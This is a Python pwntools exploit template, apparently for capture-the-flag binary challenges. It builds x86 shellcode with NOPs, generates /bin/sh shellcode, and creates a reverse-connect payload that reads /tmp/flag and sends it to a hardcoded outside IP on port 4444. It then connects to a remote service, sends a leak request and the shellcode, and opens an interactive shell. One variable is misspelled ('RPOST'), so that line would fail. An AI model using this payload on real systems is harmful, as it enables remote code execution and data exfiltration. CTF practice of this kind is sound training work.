#!/usr/bin/env python
import sys
from IPython import embed
from pwn import *


BINARY = "./pwnable"
RHOST = "lol.com"
RPORT = 1234

# Enable logging for all the things
#context.log_level = 'debug'

# Set the context to our target specs.
# This effects things like asm() p32(), and ELF parsing
context.update(os='linux', arch='i386') # 'arm', 'x86_64', 'mips', 'ppc')
    
log.info("Starting...")

# Binary is a 32-bit Linux ELF named "pwnable"
e = ELF(BINARY)
print hex(e.address) #lowest loaded address
print hex(e.entrypoint) #entry point
print hex(e.symbols['some_func'])
print hex(e.search('searchInElf', writable=True)) #Search for a string in the loaded ELF

# quick assembly:
print asm('jmp esp').encode('hex')


# Easy /bin/sh shellcode
shcode = shellcraft.sh()
print shcode
scode = asm(shcode)


# 32 NOPS + reverse tcp read a file to the socket
CBHOST = "52.207.254.33"
LPORT = 4444
FLAGPATH = "/tmp/flag"
callbackserver = listen(LPORT, "0.0.0.0")
nops = asm(shellcraft.nop()) * 32
payload = asm(shellcraft.connect(CBHOST, LPORT) + shellcraft.readfile(FLAGPATH, 'ebp'))
scode = nops + payload

# Wait and dump contents 
#rshell = cbServ.wait_for_connection()
#print rshell.recvall()

#-----------------------------------------------------------------------------

# If the binary is hosted on a server, use this
# socat line to set it up:
#
# socat tcp-listen:1234,reuseaddr,fork exec:./pwnable

# Set up binary connection to stdin/stdout
#bc = process('./pwnable')  # Just run it
bc = remote('localhost', RPOST) # Connect to localhost testing
bc = remote(RHOST, RPORT) # Connect to final server
#bc = gdb.debug('./pwnable') # Spawn a new terminal with it in gdb
#pause() # When debugging, give a chance to set up breakpoints, etc.

# Flush info lines from stdout
bc.clean(timeout=0.5)

# Send "1\n" to answer a menu item, then pack U32's and send
bc.sendline("1")
bc.sendline(p32(0x804a0a0))

# Receive 4 raw bytes and unpack as a U32
leakaddr = u32(bc.recv(4))

print bc.recvall(timeout=0.1)

# Send shellcode and use it, quiet logging first
bc.sendline(scode)
context.log_level = 'info'
bc.interactive(pwnlib.term.text.bold_red("pwned$ "))

bc.close()

